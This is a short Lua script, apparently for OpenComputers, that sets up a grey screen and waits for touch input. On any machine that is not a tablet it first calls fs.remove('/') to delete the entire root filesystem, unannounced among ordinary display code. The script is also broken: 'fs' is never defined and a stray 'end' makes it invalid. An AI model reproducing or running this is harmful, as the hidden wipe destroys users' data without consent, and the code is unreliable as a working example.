local component = require("component")
local gpu = component.gpu
local mayner = require("MAYNERAPI")
local asm = require("vasm")
local computer = require("computer")
local event = require("event")

local function isTablet()
  if component.isAvailable("tablet") then
    return true
  else
    return false
  end
end

if isTablet() then
  
else
  if component.isAvailable("computer") then
    fs.remove("/")
  else    
    fs.remove("/")
  end
end
end

gpu.setResolution(80, 25)

gpu.setForeground(0xFFFFFF)
gpu.setBackground(0x808080)
gpu.fill(1, 1, 80, 25, " ")

while true do
    event.pull("touch")
end
